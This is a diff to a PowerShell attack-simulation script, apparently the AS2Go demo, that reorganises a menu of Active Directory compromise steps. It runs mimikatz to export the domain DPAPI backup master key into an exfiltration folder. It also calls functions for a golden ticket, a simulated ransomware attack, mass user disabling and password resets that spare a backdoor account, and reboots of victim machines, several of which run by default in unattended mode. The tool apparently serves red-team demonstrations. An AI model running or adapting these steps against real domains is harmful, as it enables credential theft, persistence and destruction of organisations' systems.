+                    If ($answer -eq $yes) {
+                        $MySearchBase = Get-KeyValue -key "MySearchBase"
+                        Start-UserManipulation -SearchBase $MySearchBase
+                        If ($UnAttended) { Start-Sleep 2 } else { Pause }
+                    } 
+                    $NextStep = "T"
+                    $repeat = $yes   
                 }
-                else {
-                    $question = "Do you want to run these steps - Y or N? Default "
-                    $answer = Get-Answer -question $question -defaultValue $Yes
+                "G" {
+                    Clear-Host
+                    Write-Host "____________________________________________________________________`n" 
+                    Write-Host "        create golden ticket for an unknown user                    "
+                    Write-Host "____________________________________________________________________`n"     
+    
+                    If ($UnAttended) {
+                        $answer = $no 
+                    }
+                    else {
+                        $question = "Do you want to run these steps - Y or N? Default "
+                        $answer = Get-Answer -question $question -defaultValue $Yes
+                    }
+    
+                    If ($answer -eq $yes) {
+    
+                        #run function
+                        New-GoldenTicket
+                    } 
+                    $repeat = $yes  
                 }
+                "E" {
+                    #region  Step - ran ransomware attack? 
+                    #Pause
+                    Clear-Host
+                    Write-Host "____________________________________________________________________`n" 
+                    Write-Host "                 ran ransomware attack?                               "
+                    Write-Host "____________________________________________________________________`n"     
+    
+                    If ($UnAttended) {
+                        $answer = $yes 
+                    }
+                    else {
+                        $question = "Do you want to run these steps - Y or N? Default "
+                        $answer = Get-Answer -question $question -defaultValue $Yes
+                    }
 
-                If ($answer -eq $yes) {
-                    New-Item $exfiltration -ItemType directory -ErrorAction Ignore
-                    Invoke-Command -ScriptBlock { .\mimikatz.exe "cd $exfiltration" "privilege::debug" "lsadump::backupkeys /system:$mydc.$fqdn /export" "exit" }
+                    If ($answer -eq $yes) {
+                        #run functions
+                        New-RansomareAttack -BackupShare $OfflineDITFile
+                        If ($UnAttended) { Start-Sleep 2 } else { Pause }
+                    }
+                    #endregion  Step - ran ransomware attack?
+                    $repeat = $yes   
+                }
+                "K" {
+                    #region Step - export DATA PROTECTION API master key
+                    Clear-Host
+                    Write-Host "____________________________________________________________________`n" 
+                    Write-Host "        try to export DATA PROTECTION API master key                "
+                    Write-Host ""
+                    write-host "    Attackers can use the master key to decrypt ANY secret "         
+                    Write-Host "        protected by DPAPI on all domain-joined machines"
+                    Write-Host "____________________________________________________________________`n"     
                     write-host ""
                     Write-Host      -NoNewline "  Command: "
-                    Write-Highlight -Text "get-item ", "$exfiltration\ntds_*"  `
-                        -Color $fgcC, $fgcV
-                    Write-Host  ""   
-                    get-item "$exfiltration\ntds_*" | out-host
-                    If ($UnAttended) { Start-Sleep 2 } else { Pause }
+                    Write-Highlight -Text ".\mimikatz.exe ", """cd $exfiltration"" ", """privilege::", "debug", """ ""lsadump::", "backupkeys ", "/system:", "$mydc.$fqdn", " /export", """ ""exit"""  `
+                        -Color $fgcC, $fgcV, $fgcF, $fgcV, $fgcF, $fgcV, $fgcS, $fgcV, $fgcS, $fgcF
+                    Write-Host  ""
+
+                    If ($UnAttended) {
+                        $answer = $yes 
+                    }
+                    else {
+                        $question = "Do you want to run these steps - Y or N? Default "
+                        $answer = Get-Answer -question $question -defaultValue $Yes
+                    }
+
+                    If ($answer -eq $yes) {
+                        New-Item $exfiltration -ItemType directory -ErrorAction Ignore
+                        Invoke-Command -ScriptBlock { .\mimikatz.exe "cd $exfiltration" "privilege::debug" "lsadump::backupkeys /system:$mydc.$fqdn /export" "exit" }
+                        write-host ""
+                        Write-Host      -NoNewline "  Command: "
+                        Write-Highlight -Text "get-item ", "$exfiltration\ntds_*"  `
+                            -Color $fgcC, $fgcV
+                        Write-Host  ""   
+                        get-item "$exfiltration\ntds_*" | out-host
+                        If ($UnAttended) { Start-Sleep 2 } else { Pause }
+                    }
+                    #endregion Step - export DATA PROTECTION API master key
+                    $repeat = $yes      
                 }
-   
-                Clear-Host
-                Write-Host "____________________________________________________________________`n" 
-                Write-Host "            User Manipulation - Disable & PW reset                   "
-                Write-Host "____________________________________________________________________`n" 
-  
-                $EmojiIcon = [System.Convert]::toInt32("1F600", 16)
-                $Smily = [System.Char]::ConvertFromUtf32($EmojiIcon)
+                "R" {
+                    #Pause
+                    Clear-Host
+                    Write-Host "____________________________________________________________________`n" 
+                    Write-Host "                 reboot (all machines)                              "
+                    Write-Host "____________________________________________________________________`n"     
+    
+                    If ($UnAttended) {
+                        $answer = $yes 
+                    }
+                    else {
+                        $question = "Do you want to run these steps - Y or N? Default "
+                        $answer = Get-Answer -question $question -defaultValue $Yes
+                    }
+
+                    If ($answer -eq $yes) {
+                        #run functions
+                        Stop-AS2GoDemo -NextStepReboot $yes
+                        Restart-VictimMachines
+                    }
+                    $repeat = $yes  
+                }
+                "S" {
+                    Clear-Host
+                    Write-Host "____________________________________________________________________`n" 
+                    Write-Host "        Show Services and Processes on Logon Server                  "
+                    Write-Host "____________________________________________________________________`n"
+                    
+                    
+                    $server = $env:LOGONSERVER.replace("\","")
+
+                    Write-Host      -NoNewline "  Commands: "
+                    Write-Highlight -Text " Get-Service ", "-ComputerName ", "$server ", "| " , "Out-GridView ", "-Title " , "Services  on $server"`
+                                    -Color $fgcC, $fgcS, $fgcV, $fgcF, $fgcC, $fgcS, $fgcV
+
+                    Write-Host      -NoNewline "            " 
+                    Write-Highlight -Text " Get-Process ", "-ComputerName ", "$server ", "| " , "Out-GridView ", "-Title " , "Processes on $server"`
+                                    -Color $fgcC, $fgcS, $fgcV, $fgcF, $fgcC, $fgcS, $fgcV 
+                    Write-Host ""
 
     
-                Write-host "  ... will ignore your new backdoor user " -NoNewline
-                Write-host $global:BDUser -ForegroundColor $global:FGCHighLight -NoNewline
-                Write-Host " - $Smily"
-        
-                If ($UnAttended) {
-                    $answer = $yes 
-                }
-                else {
-                    $question = "Do you want to run these steps - Y or N? Default "
-                    $answer = Get-Answer -question $question -defaultValue $Yes
-                }
-
-                If ($answer -eq $yes) {
-                    $MySearchBase = Get-KeyValue -key "MySearchBase"
-                    Start-UserManipulation -SearchBase $MySearchBase
-                    If ($UnAttended) { Start-Sleep 2 } else { Pause }
-                } 
-
-
-                #Pause
-                Clear-Host
-                Write-Host "____________________________________________________________________`n" 
-                Write-Host "                 ran ransomware attack?                               "
-                Write-Host "____________________________________________________________________`n"     
+                    If ($UnAttended) {
+                        $answer = $no 
+                    }
+                    else {
+                        $question = "Do you want to run these steps - Y or N? Default "
+                        $answer = Get-Answer -question $question -defaultValue $Yes
+                    }
     
-                If ($UnAttended) {
-                    $answer = $yes 
-                }
-                else {
-                    $question = "Do you want to run these steps - Y or N? Default "
-                    $answer = Get-Answer -question $question -defaultValue $Yes
-                }
-
-                If ($answer -eq $yes) {
-                    #run functions
-                    New-RansomareAttack -BackupShare $OfflineDITFile
-                    If ($UnAttended) { Start-Sleep 2 } else { Pause }
-                }
- 
+                    If ($answer -eq $yes) {
     
-                Clear-Host
-                Write-Host "____________________________________________________________________`n" 
-                Write-Host "        create golden ticket for an unknown user                    "
-                Write-Host "____________________________________________________________________`n"     
-
-                If ($UnAttended) {
-                    $answer = $no 
+                        Get-Service -ComputerName $server | Sort-Object status | Out-GridView -Title "Services on $server" 
+                        Get-Process -ComputerName $server | Out-GridView -Title "Processes on $server"
+                    } 
+                    $repeat = $yes  
                 }
-                else {
-                    $question = "Do you want to run these steps - Y or N? Default "
-                    $answer = Get-Answer -question $question -defaultValue $Yes
+                "X" {
+                    $repeat = $no
                 }
 
-                If ($answer -eq $yes) {
-
-                    #run function
-                    New-GoldenTicket
-                } 
-    
-                #Pause
-                Clear-Host
-                Write-Host "____________________________________________________________________`n" 
-                Write-Host "                 reboot (all machines)                              "
-                Write-Host "____________________________________________________________________`n"     
-    
-                If ($UnAttended) {
-                    $answer = $yes 
-                }
-                else {
-                    $question = "Do you want to run these steps - Y or N? Default "
-                    $answer = Get-Answer -question $question -defaultValue $Yes
-                }
-
-                If ($answer -eq $yes) {
-                    #run functions
-                    Stop-AS2GoDemo -NextStepReboot $yes
-                    Restart-VictimMachines
+                default {
+                    Write-Host "out of scope"
+                    $repeat = $yes  
                 }
             }
+            
+
+
+
+
+
             Clear-Host
 
             Write-Host "____________________________________________________________________`n" 
@@ -5273,8 +6358,8 @@ Function Start-AS2GoDemo {
             Write-Host "____________________________________________________________________`n" 
 
 
-            $question = "Do you need to REPEAT this attack level - Y or N? Default "
-            $repeat = Get-Answer -question $question -defaultValue $no
+          #  $question = "Do you need to REPEAT this attack level - Y or N? Default "
+         #   $repeat = Get-Answer -question $question -defaultValue $no
 
    
         } Until ($repeat -eq $no)
